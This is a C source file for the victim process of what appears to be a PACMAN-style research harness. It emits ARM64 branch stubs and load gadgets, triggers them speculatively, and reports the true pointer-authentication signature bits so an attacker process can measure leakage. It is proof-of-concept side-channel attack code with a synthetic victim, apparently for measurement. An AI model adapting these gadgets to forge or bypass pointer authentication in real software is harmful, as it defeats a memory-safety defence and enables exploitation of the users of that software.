// pac_victim -- the standalone xproc victim image. A separate binary from the attacker, sharing only the
// control page over an inherited memfd. It holds its own pointer-authentication key and signs a fresh
// secret each round. btb: it maps its co-set branch sites, signs a pointer, applies only the AND mask, and
// speculatively branches. l1d: it maps its base, signs it, and runs the canonicality or AUT* load gadget.
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <signal.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <linux/prctl.h>
#include "channel.h"
#include "xpv.h"

#define STUB_BYTES 64

// pac_victim links channel.c but drives only the gadget path. These stubs satisfy the reporting symbols it
// never reaches.
FILE *g_save = NULL;
void tee_printf(const char *fmt, ...) { (void)fmt; }
int bits_match(unsigned recovered, unsigned truth, int width) {
    int count = 0;
    for (int bit = 0; bit < width; ++bit) {
        count += (((recovered >> bit) & 1u) == ((truth >> bit) & 1u));
    }
    return count;
}

static void pin(int cpu) {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof set, &set);
}
static inline uint64_t sign_pointer(uint64_t addr) { asm volatile("pacia %0,%1":"+r"(addr):"r"(0UL)); return addr; }

static long spec_flag[512]  __attribute__((aligned(4096)));
static long spec_index[512] __attribute__((aligned(4096)));
static int close_window = 0;
static inline void flush_cacheline(void *line) { asm volatile("dc civac,%0"::"r"(line):"memory"); }
static inline void memory_barrier(void) { asm volatile("dsb sy\n isb\n":::"memory"); }
static inline void speculative_call(void (*fn)(void)) {
    spec_flag[0] = 1;
    spec_index[0] = 0;
    flush_cacheline(&spec_index[0]);
    memory_barrier();
    long index = *(volatile long *)&spec_index[0];
    *(volatile long *)&spec_flag[index] = 0;
    if (close_window) {
        asm volatile("dsb sy\n isb\n" ::: "memory");
    }
    if (0 != *(volatile long *)&spec_flag[0]) {
        fn();
    }
}

// victim stub: x16 = pacia(slot0, slot1) & slot2; blr x16. Signs then applies only the AND mask.
static uint64_t victim_slots[4] __attribute__((aligned(64)));
static void emit_victim_stub(void *at, uint64_t slots_base) {
    uint32_t *words = (uint32_t *)at;
    words[0]  = 0xF81F0FFEu;
    words[1]  = 0xD2800011u | (uint32_t)((slots_base & 0xffff) << 5);
    words[2]  = 0xF2A00011u | (uint32_t)(((slots_base >> 16) & 0xffff) << 5);
    words[3]  = 0xF2C00011u | (uint32_t)(((slots_base >> 32) & 0xffff) << 5);
    words[4]  = 0xF9400230u;                                             // ldr x16, [x17]      (pointer)
    words[5]  = 0xF9400629u;                                             // ldr x9,  [x17, #8]  (modifier)
    words[6]  = 0xDAC10130u;                                             // pacia x16, x9
    words[7]  = 0xF9400A29u;                                             // ldr x9,  [x17, #16] (and mask)
    words[8]  = 0x8A090210u;                                             // and x16, x16, x9
    words[9]  = 0xD63F0200u;                                             // blr x16
    words[10] = 0xF84107FEu;
    words[11] = 0xD65F03C0u;
    __builtin___clear_cache((char *)at, (char *)at + STUB_BYTES);
}

static void run_btb(struct xpv_ctl *ctl) {
    for (int j = 0; j < ctl->nvbranch; ++j) {
        void *at = mmap((void *)ctl->victim_va[j], STUB_BYTES, PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);
        if ((void *)ctl->victim_va[j] != at) {
            perror("mmap victim branch site");
            _exit(3);
        }
        emit_victim_stub(at, (uint64_t)victim_slots);
    }
    int last = -1;
    unsigned secret = 0;
    while (!ctl->done) {
        if (ctl->round != last) {
            prctl(PR_PAC_RESET_KEYS, PR_PAC_APIAKEY, 0, 0, 0);
            secret = (unsigned)((sign_pointer(XPV_SECRET_P) >> 48) & 0x7f);
            last = ctl->round;
            ctl->reveal_req = 0;
            ctl->reveal_ack = 0;
            ctl->ack = ctl->round;
        }
        if (1 == ctl->reveal_req && 0 == ctl->reveal_ack) {
            ctl->truth = secret;
            ctl->reveal_ack = 1;
        }
        if (1 == ctl->turn) {
            if (!ctl->skip) {
                victim_slots[0] = XPV_SECRET_P;
                victim_slots[1] = 0;
                victim_slots[2] = ctl->and_mask;
                for (int j = 0; j < ctl->nvbranch; ++j) {
                    speculative_call((void (*)(void))ctl->victim_va[j]);
                }
            }
            ctl->turn = 2;
        } else {
            sched_yield();
        }
    }
}

static void run_l1d(struct xpv_ctl *ctl) {
    uint64_t base = ctl->base_va;
    void *page = mmap((void *)base, PAGE_BYTES, PROT_READ | PROT_WRITE,
                      MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE, -1, 0);
    if ((void *)base != page) {
        perror("mmap victim base");
        _exit(3);
    }
    *(volatile uint8_t *)page = 1;
    void *code = mmap(NULL, PAGE_BYTES, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (MAP_FAILED == code) {
        perror("mmap gadget");
        _exit(3);
    }
    gadget_fn gadget = emit_gadget(code, (enum pac_switch)ctl->sw, (enum medium)ctl->med);
    static struct slot slot;
    uint64_t signature = 0;
    int last = -1;
    while (!ctl->done) {
        int round = ctl->round;
        if (round != last && 0 <= round) {
            prctl(PR_PAC_RESET_KEYS, PR_PAC_APIAKEY, 0, 0, 0);
            signature = pac_sign(base, rand_u64());
            last = round;
            ctl->ready = round;
        }
        if (ctl->reveal_req != ctl->reveal_ack) {
            ctl->truth = (unsigned)((signature >> 48) & 0x7f);
            ctl->reveal_ack = ctl->reveal_req;
        }
        if (1 == ctl->turn) {
            if (0 > ctl->sel) {
                slot_secret(&slot, (enum pac_switch)ctl->sw, signature, base, ctl->bit);
            } else {
                slot_profile(&slot, (enum pac_switch)ctl->sw, base, ctl->bit, ctl->sel);
            }
            victim_transmit(gadget, &slot, ctl->control);
            ctl->turn = 2;
        } else {
            sched_yield();
        }
    }
}

int main(int argc, char **argv) {
    if (3 != argc) {
        fprintf(stderr, "pac_victim is launched by cross_boundary --boundary xproc\n");
        return 2;
    }
    int cpu = atoi(argv[1]);
    int fd = atoi(argv[2]);
    struct xpv_ctl *ctl = mmap(NULL, sizeof *ctl, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (MAP_FAILED == ctl) {
        perror("mmap control");
        return 1;
    }
    prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);   // die with the attacker, never orphan-spin the core
    pin(cpu);
    enable_store_bypass();
    while (!ctl->params_ready) {
        sched_yield();
    }
    close_window = ctl->control;
    if (XPV_BTB == ctl->mode) {
        run_btb(ctl);
    } else {
        run_l1d(ctl);
    }
    return 0;
}
